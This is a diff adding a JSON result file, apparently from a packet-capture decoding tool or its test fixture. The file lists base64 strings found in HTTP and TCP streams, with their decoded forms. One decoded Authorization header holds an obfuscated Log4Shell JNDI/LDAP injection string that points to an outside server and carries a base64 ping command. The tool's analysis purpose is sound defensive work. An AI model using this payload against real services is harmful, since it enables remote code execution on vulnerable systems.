@@ -1,0 +1,186 @@
+{
+  "ok": true,
+  "data": {
+    "status": "decode_success",
+    "decoded_candidates": [
+      {
+        "segment_no": 4,
+        "candidate_type": "base64",
+        "position": "http_header.authorization",
+        "source": "http.authorization.basic.value",
+        "raw": "bG9nNHNoZWxsOiR7JHs6Oi1qfW5kaTpsZGFwOi8vMzQuOTEuNzMuMzc6MTM4OS9CYXNpYy9Db21tYW5kL0Jhc2U2NC9jR2x1WnlBdFl5QXhNQ0F4TGpFdU1TNHh9",
+        "decoded_preview": "log4shell:${${::-j}ndi:ldap://34.91.73.37:1389/Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x}",
+        "normalized_payload": "log4shell:${jndi:ldap://34.91.73.37:1389/Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x}",
+        "nested_candidates": [
+          {
+            "candidate_type": "base64",
+            "position": "nested.base64_path",
+            "raw": "cGluZyAtYyAxMCAxLjEuMS4x",
+            "decoded_preview": "ping -c 10 1.1.1.1",
+            "decode_status": "success",
+            "span": {
+              "start": 62,
+              "end": 86
+            }
+          }
+        ],
+        "decode_status": "success",
+        "span": null,
+        "residue_signals": [],
+        "stream_key": "172.17.0.1:50172-172.17.0.3:8000-tcp",
+        "protocol": "HTTP"
+      },
+      {
+        "segment_no": 13,
+        "candidate_type": "base64",
+        "position": "nested.base64_path",
+        "source": "tcp_payload.text.base64_path",
+        "raw": "cGluZyAtYyAxMCAxLjEuMS4x",
+        "decoded_preview": "ping -c 10 1.1.1.1",
+        "normalized_payload": null,
+        "nested_candidates": [],
+        "decode_status": "success",
+        "span": {
+          "start": 30,
+          "end": 54
+        },
+        "residue_signals": [],
+        "stream_key": "172.17.0.3:54590-34.91.73.37:1389-tcp",
+        "protocol": "TCP"
+      },
+      {
+        "segment_no": 42,
+        "candidate_type": "base64",
+        "position": "nested.base64_path",
+        "source": "tcp_payload.text.base64_path",
+        "raw": "cGluZyAtYyAxMCAxLjEuMS4x",
+        "decoded_preview": "ping -c 10 1.1.1.1",
+        "normalized_payload": null,
+        "nested_candidates": [],
+        "decode_status": "success",
+        "span": {
+          "start": 30,
+          "end": 54
+        },
+        "residue_signals": [],
+        "stream_key": "172.17.0.3:54594-34.91.73.37:1389-tcp",
+        "protocol": "TCP"
+      },
+      {
+        "segment_no": 67,
+        "candidate_type": "base64",
+        "position": "nested.base64_path",
+        "source": "tcp_payload.text.base64_path",
+        "raw": "cGluZyAtYyAxMCAxLjEuMS4x",
+        "decoded_preview": "ping -c 10 1.1.1.1",
+        "normalized_payload": null,
+        "nested_candidates": [],
+        "decode_status": "success",
+        "span": {
+          "start": 30,
+          "end": 54
+        },
+        "residue_signals": [],
+        "stream_key": "172.17.0.3:54596-34.91.73.37:1389-tcp",
+        "protocol": "TCP"
+      },
+      {
+        "segment_no": 94,
+        "candidate_type": "base64",
+        "position": "nested.base64_path",
+        "source": "tcp_payload.text.base64_path",
+        "raw": "cGluZyAtYyAxMCAxLjEuMS4x",
+        "decoded_preview": "ping -c 10 1.1.1.1",
+        "normalized_payload": null,
+        "nested_candidates": [],
+        "decode_status": "success",
+        "span": {
+          "start": 30,
+          "end": 54
+        },
+        "residue_signals": [],
+        "stream_key": "172.17.0.3:54598-34.91.73.37:1389-tcp",
+        "protocol": "TCP"
+      }
+    ],
+    "failed_candidates": [
+      {
+        "segment_no": 15,
+        "candidate_type": "base64",
+        "position": "nested.base64_path",
+        "source": "tcp_payload.text.base64_path",
+        "raw": "cGluZyAtYyAxMCAxLjEuMS4x0",
+        "decoded_preview": null,
+        "normalized_payload": null,
+        "nested_candidates": [],
+        "decode_status": "failed",
+        "span": {
+          "start": 32,
+          "end": 57
+        },
+        "residue_signals": [],
+        "stream_key": "34.91.73.37:1389-172.17.0.3:54590-tcp",
+        "protocol": "TCP"
+      },
+      {
+        "segment_no": 44,
+        "candidate_type": "base64",
+        "position": "nested.base64_path",
+        "source": "tcp_payload.text.base64_path",
+        "raw": "cGluZyAtYyAxMCAxLjEuMS4x0",
+        "decoded_preview": null,
+        "normalized_payload": null,
+        "nested_candidates": [],
+        "decode_status": "failed",
+        "span": {
+          "start": 32,
+          "end": 57
+        },
+        "residue_signals": [],
+        "stream_key": "34.91.73.37:1389-172.17.0.3:54594-tcp",
+        "protocol": "TCP"
+      },
+      {
+        "segment_no": 70,
+        "candidate_type": "base64",
+        "position": "nested.base64_path",
+        "source": "tcp_payload.text.base64_path",
+        "raw": "cGluZyAtYyAxMCAxLjEuMS4x0",
+        "decoded_preview": null,
+        "normalized_payload": null,
+        "nested_candidates": [],
+        "decode_status": "failed",
+        "span": {
+          "start": 32,
+          "end": 57
+        },
+        "residue_signals": [],
+        "stream_key": "34.91.73.37:1389-172.17.0.3:54596-tcp",
+        "protocol": "TCP"
+      },
+      {
+        "segment_no": 96,
+        "candidate_type": "base64",
+        "position": "nested.base64_path",
+        "source": "tcp_payload.text.base64_path",
+        "raw": "cGluZyAtYyAxMCAxLjEuMS4x0",
+        "decoded_preview": null,
+        "normalized_payload": null,
+        "nested_candidates": [],
+        "decode_status": "failed",
+        "span": {
+          "start": 32,
+          "end": 57
+        },
+        "residue_signals": [],
+        "stream_key": "34.91.73.37:1389-172.17.0.3:54598-tcp",
+        "protocol": "TCP"
+      }
+    ],
+    "residue_candidates": [],
+    "excluded_streams": [],
+    "checked_streams": 12,
+    "checked_segments": 106
+  },
+  "error": null
+}
